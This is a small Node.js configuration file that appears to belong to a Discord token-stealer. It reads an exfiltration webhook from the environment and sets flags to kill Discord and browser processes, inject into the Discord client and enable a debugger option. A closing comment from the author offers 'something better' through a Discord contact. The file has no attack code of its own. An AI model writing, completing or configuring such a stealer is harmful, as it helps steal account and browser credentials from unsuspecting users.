require("dotenv").config();
const process = require("process");

module.exports = function getconfig() {
    return {
        "webhook": process.env.WEBHOOK || "",
        "kill":{ 
            "discords": "yes",
            "browsers": "yes",
        }, 
        "debugger": "yes", 
        "injection": "yes", 
    }
}
// if you want something better, you can contact me, DIsocrd: k4itrunnnssh